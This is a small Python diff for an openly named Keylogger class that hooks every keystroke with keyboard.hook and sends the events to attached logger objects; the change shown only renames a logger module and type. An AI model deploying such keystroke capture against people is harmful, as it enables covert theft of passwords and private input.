@@ -3,7 +3,7 @@ import time
 
 import keyboard
 
-import keylogger_logger
+import logger
 
 
 class Keylogger:
@@ -14,12 +14,12 @@ class Keylogger:
         # log each key pressed
         keyboard.hook(callback=self._on_event)
         
-    def attach_logger(self, logger: keylogger_logger._AbstractLogger):
+    def attach_logger(self, logger: logger.AbstractLogger):
         self.__loggers.append(logger)
         logger.on_attached()
         return self
 
-    def detach_logger(self, logger: keylogger_logger._AbstractLogger):
+    def detach_logger(self, logger: logger.AbstractLogger):
         self.__loggers.remove(logger)
         logger.on_detached()
         return self
